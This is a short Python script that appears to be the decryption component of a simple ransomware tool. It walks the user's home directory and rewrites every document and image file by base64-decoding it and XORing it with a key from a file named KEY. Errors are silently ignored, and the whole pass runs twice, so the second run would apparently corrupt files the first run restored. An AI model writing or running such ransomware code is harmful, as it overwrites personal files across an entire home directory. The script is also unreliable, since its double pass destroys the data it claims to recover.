import os
import base64

file_exts = ["txt", "rtf", "doc", "docx", "xls", "xlsx", "ppt", "pptx", "pdf", "jpg", "jpeg", "png", "jfif"]
sysRoot = os.path.expanduser('~')

def decrypt_file(file_path, key):
    with open(file_path, "rb") as f:
        data = f.read()
    deserialized_data = base64.b64decode(data)
    unencrypted_data = bytearray()
    for i, byte in enumerate(deserialized_data):
        unencrypted_data.append(byte ^ key[i % len(key)])
    with open(file_path, "wb") as f:
        f.write(unencrypted_data)


def decrypt_system(key):
        system = os.walk(sysRoot, topdown=True)
        for root, dirs, files in system:
            for file in files:
                file_path = os.path.join(root, file)
                if file.split('.')[-1].lower() in file_exts:
                    try:
                        decrypt_file(file_path, key)
                    except:
                        continue

def main():
    with open("KEY", "rb") as key_file:
        key = key_file.read()
    for i in range(2):
        decrypt_system(key)


if __name__ == "__main__":
    main()